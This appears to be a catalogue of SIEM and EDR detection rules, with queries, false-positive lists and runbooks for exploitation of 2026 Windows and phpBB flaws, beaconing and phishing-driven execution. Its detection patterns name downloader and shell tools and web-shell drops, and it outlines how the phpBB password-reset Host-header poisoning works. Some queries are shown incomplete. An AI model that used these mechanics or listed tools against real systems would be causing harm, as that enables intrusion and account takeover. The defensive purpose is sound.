HTTP.sys / IIS w3wp.exe spawning shell or LOLBin (CVE-2026-47291 post-exploit) AIExploitation High
CVE-2026-47291 is an integer overflow in HTTP.sys (kernel) allowing unauthenticated network RCE. Post-exploitation in IIS environments typically surfaces as the w3wp.exe app-pool worker spawning cmd/powershell or LOLBins, or as `System` process anomalies. This rule pivots on the w3wp parent → suspicious child shape which is essentially absent in healthy IIS operations. Rationale: Article: 'CVE-2026-47291 ... integer overflow ... in Windows HTTP.sys that allows an unauthorized attacker to execute code over a network.' HTTP.sys is a kernel driver, but IIS deployments funnel HTTP.sys traffic into w3wp.exe app-pool workers — successful exploitation gives the attacker code in that context. w3wp spawning cmd/PowerShell is high-fidelity (legitimate web apps rarely shell out).
ATT&CKT1190 T1505.003 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legacy ASP.NET apps using `Process.Start("cmd /c ...")` for legitimate batch work (e.g. PDF rendering, ImageMagick wrappers)
  • SharePoint or Exchange Health Manager scripts that invoke PowerShell from w3wp
  • WebDeploy / msdeploy.exe operations during application deploys
  • Web-based admin consoles (HelpDesk apps, ITSM portals) that legitimately invoke `net.exe`/`whoami.exe` on behalf of authenticated admins
Suppression filter
| where ChildCmd !contains "WebDeploy" and ChildCmd !contains "msdeploy"
| where ParentCmd !contains "HealthMailbox"
Response runbook
Step 1: Triage — pull the parent w3wp.exe command line to identify the IIS App Pool (`-ap` argument). Check if that pool is on a known-legacy/known-shells allowlist for the org; if not, treat as live. Step 2: Contain — recycle the App Pool, capture a memory dump of w3wp.exe via Sysinternals procdump, and isolate the host. Pull the IIS access logs for the 5 minutes prior — large or malformed POSTs to .aspx/.asmx handlers are the likely vector. Step 3: Hunt — search the IIS inetpub wwwroot folders for new .aspx/.ashx/.config files created by the IIS worker (web shells), and pivot to CVE-2026-47291 patch status across the IIS fleet.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "w3wp.exe"

CTFMON spawning elevated child or CTFMON-hosted privilege escalation (CVE-2026-45586 / GreenPlasma) AIExploitation Medium
CVE-2026-45586 is a privilege-escalation flaw in the Windows Collaborative Translation Framework (CTFMON), publicly disclosed as a zero-day and suspected to be the GreenPlasma PoC released by Chaotic Eclipse. CTFMON normally only spawns IME/language helpers at the user's own integrity level. Detection: ctfmon.exe (or its CTF API consumers) spawning a child at High/System integrity, or an integrity-level escalation event whose initiating process is ctfmon.exe. Rationale: Article: 'CVE-2026-45586 ... Windows Collaborative Translation Framework (CTFMON) privilege escalation' and 'suspected to be a fix for a zero-day privilege escalation exploit that Chaotic Eclipse released under the name GreenPlasma.' ctfmon.exe legitimately spawns only language-bar helpers at the user's own integrity. A high-integrity child from a medium-integrity parent is a textbook LPE signal.
ATT&CKT1068
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Windows Error Reporting auto-launching wermgr.exe/WerFault.exe under ctfmon — filtered above
  • MUI / language pack installer running under TrustedInstaller (parent would already be High integrity — caught by the integrity-delta filter)
  • Sysinternals AccessChk by an IR team checking CTF token integrity
  • RDP language input service restart during a console handoff
Suppression filter
| where ChildImage !has @"\Windows\WinSxS\"
| where ParentImage !has @"\Windows\WinSxS\"
Response runbook
Step 1: Triage — confirm the integrity delta (parent Medium / child High or System). Pull the SHA256 of the spawned child binary and any registry writes by ctfmon ±60s (CTFMON COM hijack patterns write to HKCU\Software\Microsoft\CTF). Step 2: Contain — kill the elevated child, isolate the host, capture a memory dump of ctfmon.exe and the elevated child. Step 3: Hunt — back-search 30 days for the same SHA256 anywhere in the fleet (likely PoC artefact named after GreenPlasma/MiniPlasma), and pivot to the CVE-2026-45586 patch-status UC to find unpatched hosts that could be next.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "ctfmon.exe"
| where FileName !in~ ("ctfmon.exe","conhost.exe","wermgr.exe","WerFault.exe")
| where ProcessIntegrityLevel in~ ("High","System")
| where InitiatingProcessIntegrityLevel !in~ ("High","System")
| project Timestamp, DeviceName, AccountName, AccountDomain,
          ParentImage=InitiatingProcessFolderPath,
          ParentIntegrity=InitiatingProcessIntegrityLevel,
          ParentCmd=InitiatingProcessCommandLine,
          ChildImage=FolderPath,
          ChildIntegrity=ProcessIntegrityLevel,
          ChildCmd=ProcessCommandLine,
          SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith @"\ctfmon.exe"
| extend NewBase = tolower(tostring(split(NewProcessName, "\\")[-1]))
| where NewBase !in ("ctfmon.exe","conhost.exe","wermgr.exe","werfault.exe")
| where TokenElevationType in ("%%1936","%%1937")  // Full Token (admin) — the LPE outcome
| project TimeGenerated, Computer, SubjectUserName, TargetUserName, NewProcessName, CommandLine, ParentProcessName, TokenElevationType
| order by TimeGenerated desc
title: CTFMON Spawning Elevated Child (CVE-2026-45586 GreenPlasma LPE)
id: 7a1e4c83-6f2b-4a93-b5c1-d4e8f1a02c3d
description: Detects ctfmon.exe (Collaborative Translation Framework) spawning a child process at High or System integrity from a non-elevated parent context. Consistent with exploitation of CVE-2026-45586 — the CTFMON privilege-escalation zero-day publicly disclosed by Chaotic Eclipse as 'GreenPlasma' before the June 2026 patch.
references:
  - https://thehackernews.com/2026/06/microsoft-patches-record-206-flaws.html
author: thn-usecases
date: 2026/06/12
tags:
  - attack.t1068
  - attack.privilege_escalation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\ctfmon.exe'
    IntegrityLevel:
      - 'High'
      - 'System'
  filter_legit:
    Image|endswith:
      - '\ctfmon.exe'
      - '\conhost.exe'
      - '\wermgr.exe'
      - '\WerFault.exe'
  condition: selection and not filter_legit
level: high
source:windows.sysmon @EventID:1 (@ParentImage:(*\\ctfmon.exe OR *\\Ctfmon.exe OR *\\CTFMON.EXE)) (@IntegrityLevel:(High OR System)) -@Image:(*\\ctfmon.exe OR *\\Ctfmon.exe OR *\\conhost.exe OR *\\WerFault.exe OR *\\wermgr.exe)
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/ctfmon\.exe$/i
| IntegrityLevel=/^(High|System)$/i
| NOT ImageFileName=/\\(ctfmon|conhost|wermgr|WerFault)\.exe$/i
| groupBy([aid, ComputerName, ParentImageFileName, ImageFileName, CommandLine, UserName, IntegrityLevel], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmd values(Processes.process_integrity_level) as child_integrity values(Processes.parent_process_integrity_level) as parent_integrity from datamodel=Endpoint.Processes where Processes.parent_process_name="ctfmon.exe" Processes.process_integrity_level IN ("high","system") by Processes.dest Processes.user Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | where parent_integrity!="high" AND parent_integrity!="system"
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmd values(Processes.process_integrity_level) as child_integrity values(Processes.parent_process_integrity_level) as parent_integrity from datamodel=Endpoint.Processes where Processes.parent_process_name="ctfmon.exe" Processes.process_integrity_level IN ("high","system") by Processes.dest Processes.user Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | where parent_integrity!="high" AND parent_integrity!="system"
PoC artefact drop — Chaotic Eclipse named exploits (YellowKey, GreenPlasma, MiniPlasma, RoguePlanet, bitskrieg) AIInstallation Low
Article references five publicly-released PoCs by researcher Chaotic Eclipse (aka Nightmare-Eclipse): YellowKey (CVE-2026-45585 BitLocker bypass), GreenPlasma (CVE-2026-45586 CTFMON LPE), MiniPlasma (CVE-2020-17103 print spooler incomplete fix), RoguePlanet (Microsoft Defender race-condition to SYSTEM cmd), and bitskrieg (CVE-2026-50507 BitLocker full-data bypass). Hunt for file writes or process executions whose name or folder contains these PoC code-names — researchers and red-teamers commonly preserve the published name in repo/binary names, and uplifted commodity attackers often do not bother to rename. Rationale: Article explicitly names the five Chaotic Eclipse / Nightmare-Eclipse PoCs (YellowKey for CVE-2026-45585, GreenPlasma for CVE-2026-45586, MiniPlasma against CVE-2020-17103, RoguePlanet for the Defender race condition, bitskrieg for CVE-2026-50507). String-name hunting is low-precision but high-recall; useful for catching unsophisticated reuse of the public PoCs before defenders patch.
ATT&CKT1588.005 T1068
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Red team / pentest engagement legitimately downloading the PoCs to a test host
  • Security researchers in the org investigating the PoCs in a sandbox VM
  • Threat intel team archiving copies for analysis
  • Documentation / blog posts (.html, .pdf) referencing the names — high FP on browser cache hits
  • Wallpaper or theme files coincidentally named (yellow key, etc.)
Suppression filter
| where FolderPath !has @"\AppData\Local\Microsoft\Edge\User Data\Default\Cache\"
| where FolderPath !has @"\AppData\Local\Google\Chrome\User Data\Default\Cache\"
| where FileName !endswith ".pdf" and FileName !endswith ".html" and FileName !endswith ".htm"
Response runbook
Step 1: Triage — distinguish PoC binaries (.exe, .ps1, .py, .dll) from documentation files (.pdf, .html, .docx). For binary hits, pull SHA256 and check it against VirusTotal / internal sandbox. For doc hits, check user role (red team / IR / researcher allowlist). Step 2: Contain — if a binary executed on a non-research host, isolate and capture memory + the binary. Confirm whether the corresponding CVE patch was applied; if not, the host may already be compromised at the privilege level the PoC achieves (SYSTEM for RoguePlanet/GreenPlasma, encrypted-data access for YellowKey/bitskrieg). Step 3: Hunt — pull the InitiatingProcessAccountName and look 24h back/forward for that user's other activity (downloads, browser, USB). Pivot to the patch-status UC for the matching CVE.
let Codenames = dynamic(["yellowkey","greenplasma","miniplasma","rogueplanet","bitskrieg"]);
let FileHits = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where ActionType in~ ("FileCreated","FileRenamed","FileModified")
    | extend low_name = tolower(FileName), low_path = tolower(FolderPath)
    | where low_name has_any (Codenames) or low_path has_any (Codenames)
    | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
              InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName;
let ProcHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | extend low_cmd = tolower(ProcessCommandLine), low_img = tolower(FolderPath), low_name = tolower(FileName)
    | where low_name has_any (Codenames) or low_img has_any (Codenames) or low_cmd has_any (Codenames)
    | project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256,
              InitiatingProcessFileName, InitiatingProcessCommandLine;
union FileHits, ProcHits
| order by Timestamp desc
let Codenames = dynamic(["yellowkey","greenplasma","miniplasma","rogueplanet","bitskrieg"]);
ImFileEvent
| where TimeGenerated > ago(30d)
| extend low_path = tolower(TargetFilePath), low_name = tolower(TargetFileName)
| where low_name has_any (Codenames) or low_path has_any (Codenames)
| project TimeGenerated, DvcHostname, EventType, TargetFilePath, TargetFileName, TargetFileSHA256,
          ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

description: Detects file creation, rename, or modification where the filename or path contains a code-name from one of the Chaotic Eclipse PoCs released around June 2026 against Microsoft (YellowKey, GreenPlasma, MiniPlasma, RoguePlanet, bitskrieg). High-recall low-precision hunt for PoC artefacts.
references:

(#event_simpleName=FileWritten OR #event_simpleName=ProcessRollup2)

| groupBy([aid, ComputerName, event_simpleName, TargetFileName, ImageFileName, CommandLine], function=count())

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB

``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

phpBB instance vulnerable to CVE-2026-29199 (3.3.16 and below / 4.0.0-a2) exposed on managed assets AIReconnaissance High
Surface owned web hosts running phpBB at or below 3.3.16, or 4.0.0-a2 — the versions Aikido confirmed are exploitable by a single unauthenticated HTTP request that yields a valid session as any user, including administrators. Asset-side hunt is the first step before pivoting to exploit-pattern detection; the article explicitly withheld payload details to give admins time to upgrade. Rationale: Aikido article explicitly names vulnerable versions (3.3.16 and below, 4.0.0-a2) and CVE-2026-29199. Cross-checked phpBB 3.3.17 release notes (phpbb.com viewtopic 2672170), SentinelOne CVE database entry, and Infosecurity-Magazine coverage. TVM is the cleanest pivot since Aikido deliberately withheld exploit payload until the patch window closes. Datadog/Falcon/CloudWatch left empty — vulnerability-management data is not in the listed Datadog standard sources, not an FDR event_simpleName, and not a CloudTrail/VPC/GuardDuty signal. Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-29199/ • https://www.phpbb.com/community/viewtopic.php?t=2672170 • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/ • https://www.phpbb.com/support/documents.php?mode=changelog&version=3
ATT&CKT1190 T1592.002
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Honeypot phpBB intentionally left at 3.3.16 by red team or threat-research deployment
  • Lab / staging forum mirroring prod version for migration testing
  • Pre-prod environment outside the normal patch SLA window
  • Vendor-bundled appliance shipping phpBB whose vendor hasn't released a re-packaged 3.3.17 yet
  • TVM scan cache predating today's emergency patch deployment
Suppression filter
| where not(DeviceName has_any ("-honey", "-honeypot-", "-lab-", "-staging-", "-dev-", "-test-"))
Response runbook
1. Triage: for each hit, confirm the asset is actually listening on the phpBB site by curling the host's `/` and checking the HTML footer or `/docs/CHANGELOG.html`; rule out stale TVM cache from before the patch window. 2. Contain: if internet-facing, push the WAF to require auth on `ucp.php?mode=sendpassword` and the OAuth callback paths, OR pull DNS until 3.3.17 (master for 4.x) is deployed; in the ACP, set `force_server_vars=true` and configure explicit `server_name`/`server_protocol`. 3. Hunt: pivot to web access logs on the same hostname for the last 30 days looking for sendpassword POSTs with anomalous Host header (UC2) and OAuth login_link bursts (UC3) — both could indicate prior exploitation against the now-identified vulnerable host.

phpBB password-reset Host header injection (CVE-2026-29199 exploitation) AIExploitation High
POST to phpBB's password-reset endpoint `ucp.php?mode=sendpassword` where the HTTP Host header on the request does NOT match the site's canonical hostname allow-list. This is the request shape that lets an unauthenticated attacker poison the reset email — phpBB derives the reset link from the inbound Host header when `force_server_vars` is unset, so the victim follows a link to attacker.tld and the single-use token is delivered to the attacker. Rationale: Article describes a single-HTTP-request unauth account takeover; SentinelOne's CVE-2026-29199 write-up specifies the root cause as Host-header trust in `ucp.php?mode=sendpassword` when `force_server_vars` is disabled, and phpBB 3.3.17 release notes (phpbb.com 2672170) confirm the fix. The detection anchors on the article-specific endpoint + the corroborated trust-boundary violation. Defender XDR has no native web-access-log table so defender_kql is left empty. Datadog has no standard web-access-log source in the listed schema (nginx/apache custom integrations would need a pipeline) — left empty rather than fabricated. Falcon FDR does not ship web server access logs as an event_simpleName — empty. CloudWatch path empty unless AWS WAF logs are present (not in the listed canonical log groups). Cross-checked against: • https://www.sentinelone.com/vulnerability-database/cve-2026-29199/ • https://www.phpbb.com/community/viewtopic.php?t=2672170 • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/
ATT&CKT1190 T1566.002
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate phpBB instance reachable via multiple aliased hostnames not yet added to the canonical allow-list
  • Reverse proxy / CDN (Cloudflare, Akamai) inserting an X-Forwarded-Host but the origin Host header points at the internal origin name
  • Vulnerability scanner (Qualys, Tenable, Acunetix) probing the password-reset endpoint with a synthetic Host header
  • User-misconfigured custom domain on a hosted phpBB that hasn't propagated to ops' canonical list
  • phpBB instance bound to a raw IPv4 address — Host header is the IP, not a name
Response runbook
1. Triage: extract the anomalous Host value and the requesting SrcIpAddr; check if the value is a known typosquat (paypa1.com style) or a recently-registered domain, and whether the source IP recently hit the same `sendpassword` endpoint with the legit Host (recon-then-exploit shape). 2. Contain: temporarily WAF-block POSTs to `ucp.php?mode=sendpassword` with any Host other than the canonical allow-list; force-revoke any password-reset tokens issued in the last 24h via phpBB ACP; if internet-facing, set `force_server_vars=true` with explicit `server_name`/`server_protocol` in `config.php` immediately. 3. Hunt: pull outbound mail logs from the phpBB server for password-reset emails sent in the last 7d and check whether the Reset URL contains a non-canonical hostname; pivot to victim mailboxes for the same window to see if any user clicked an inbound reset link they didn't initiate.
let CanonicalHosts = dynamic(["forum.example.com","www.example.com"]);   // REPLACE with your phpBB canonical hostnames
ImWebSession
| where TimeGenerated > ago(24h)
| where HttpMethod =~ "POST"
| where Url has "ucp.php" and Url has "mode=sendpassword"
| where isnotempty(HttpHostName)
| extend HostLower = tolower(HttpHostName)
| where not(HostLower in~ (CanonicalHosts))
| where not(HostLower matches regex @"^(\d{1,3}\.){3}\d{1,3}$")   // ignore direct-IP probes if you want raw signal — remove this line to keep them
| summarize Count=count(), DistinctSrc=dcount(SrcIpAddr), SampleSrc=make_set(SrcIpAddr,5), SampleUA=any(HttpRequestHeaderUserAgent), SampleReferer=any(HttpRequestHeaderReferer) by DstHostname, HostLower, bin(TimeGenerated, 10m)
| order by TimeGenerated desc

phpBB OAuth account-binding CSRF — anomalous traffic to pre-3.3.17 OAuth callback path AIExploitation Medium
Hunt for the pre-patch OAuth callback path (`ucp.php` with `oauth_service=` / `mode=login_link` / `login=external`) being hit with cross-site referrers or unusual session-cookie state — the request shape that exploits the CSRF + state-validation flaw allowing an attacker to silently bind their own OAuth credential to a victim's logged-in phpBB session (one of the two improper checks disclosed in 3.3.17 release notes; no click required on one variant). Post-patch this path is replaced by `/user/oauth/authenticate/...` so legitimate traffic should be migrating away. Rationale: phpBB 3.3.17 release notes (phpbb.com 2672170) describe two improper OAuth checks — one a CSRF + state-validation bypass that needs only a logged-in victim to load a crafted URL — and explicitly state the redirect URI handler has moved to `/user/oauth/authenticate/...` (the only code block in the original Aikido article). Inferring the pre-3.3.17 callback shape from phpBB convention (ucp.php with oauth_service / mode=login_link / login=external query params) is the closest article-grounded pivot until the second Aikido post drops technical details. Marked hunting + Medium confidence because legitimate OAuth flows look very similar — operators must tune CanonicalHosts. Defender empty (no native web log table); Datadog empty (no standard web log source in schema); Falcon empty (web access logs not in FDR event_simpleName set); CloudWatch empty (not a CloudTrail/VPC/GuardDuty signal). Cross-checked against: • https://www.phpbb.com/community/viewtopic.php?t=2672170 • https://www.sentinelone.com/vulnerability-database/cve-2026-29199/ • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/
ATT&CKT1098 T1550.001 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Legitimate Google/Facebook/GitHub OAuth provider redirecting to a phpBB instance whose admin hasn't yet updated the redirect URI to /user/oauth/authenticate/... — the Referer will look 'external' (accounts.google.com / facebook.com) for genuine logins
  • User clicks a forum-share link from an external blog/social site that lands on a phpBB page mid-OAuth flow
  • Internal-monitoring or uptime checker hitting the OAuth callback as part of a synthetic transaction
  • phpBB cross-instance content embeds — referrer is another forum the user was browsing
  • Security scanner (Aikido Attack, Acunetix, Burp) probing the legacy OAuth endpoint as part of a CVE-2026-29199 verification
Response runbook
1. Triage: for each hit, check whether the destination phpBB instance is still pre-3.3.17 (TVM/UC1 hit) — post-patch this endpoint should be dead and any traffic is either misconfig or probing. Confirm the Referer host is not an expected OAuth provider domain (accounts.google.com, github.com, login.facebook.com). 2. Contain: rotate the phpBB site's OAuth provider client secrets in case the bind succeeded; in phpBB ACP review `phpbb_user_group` for accounts whose `group_id` changed in the last 14 days, and review the `oauth_accounts` table for new bindings without a corresponding user-initiated link event in the application audit log. 3. Hunt: pivot to UC2 on the same dest host and timeframe for prior recon, and to UrlClickEvents / EmailEvents for inbound `ucp.php?oauth_service=` links sent to staff mailboxes (the no-click variant still needs the URL delivered somehow — phishing email, forum DM, watering-hole).
let LookbackHours = 24h;
let CanonicalHosts = dynamic(["forum.example.com","www.example.com"]);   // REPLACE with your phpBB canonical hostnames
ImWebSession
| where TimeGenerated > ago(LookbackHours)
| where Url has "ucp.php"
| where (Url has "oauth_service=") or (Url has "mode=login_link" and Url has "login=external")
| extend Referer = tolower(coalesce(HttpRequestHeaderReferer,""))
| extend RefererHost = extract(@"^https?://([^/]+)", 1, Referer)
| extend IsExternalReferer = iff(isempty(Referer), true, not(RefererHost in~ (CanonicalHosts)))
| where IsExternalReferer == true
| project TimeGenerated, SrcIpAddr, DstHostname, Url, HttpMethod, HttpStatusCode, HttpRequestHeaderUserAgent, HttpRequestHeaderReferer, HttpRequestHeaderCookie
| summarize Count=count(), DistinctSrc=dcount(SrcIpAddr), Sources=make_set(SrcIpAddr, 8), Referers=make_set(HttpRequestHeaderReferer, 4), SampleUrl=any(Url), SampleUA=any(HttpRequestHeaderUserAgent) by DstHostname, bin(TimeGenerated, 5m)
| order by TimeGenerated desc

ISO File Dropped to Downloads — RoguePlanet Defender Exploit Precursor AIDelivery Medium
Hunts for browser/email-client writes of .iso containers into user Downloads. The RoguePlanet PoC explicitly requires standard-user ISO mounting on Windows 11/10 workstations as the delivery primitive — making fresh ISO drops the earliest detectable signal. Rationale: Article-specific: 'standard users cannot mount an ISO image' explicitly identifies ISO mount as the required exploit precursor on workstations. Detecting the .iso file landing in Downloads from a browser/email client is the earliest high-fidelity signal before the race condition is even attempted.
ATT&CKT1553.005 T1566.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment

  • Developer downloading Linux distro ISOs for VM testing
  • End user downloading game installer distributed as ISO (older titles)
  • MSDN/Visual Studio subscriber pulling reference ISOs
  • Vendor support download containing tooling as ISO
Suppression filter
| where not (FileOriginUrl has_any ("microsoft.com","visualstudio.com","redhat.com","ubuntu.com","debian.org","vmware.com") and InitiatingProcessFileName !~ "outlook.exe")
Response runbook
1) Triage: hash the ISO, submit to VirusTotal/internal sandbox, check FileOriginUrl for the source URL and whether it matches a known software vendor or a phishing landing. 2) Contain: if low-reputation, quarantine the file via MDE Live Response, block the SHA256 in custom IOC, advise user not to mount the image. 3) Hunt: pivot on DeviceId for any Mount-DiskImage activity in the next hour, look for MsMpEng.exe or NisSrv.exe spawning shells (UC2), and search org-wide for the same FileOriginUrl to identify other recipients of the same lure.

| where TargetFilePath has @"\Downloads\"

| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, TargetFileName, TargetFilePath, TargetFileSHA256, TargetFileSize, ActingProcessName
| order by TimeGenerated desc
title: ISO File Dropped to Downloads by Browser or Mail Client - RoguePlanet Precursor
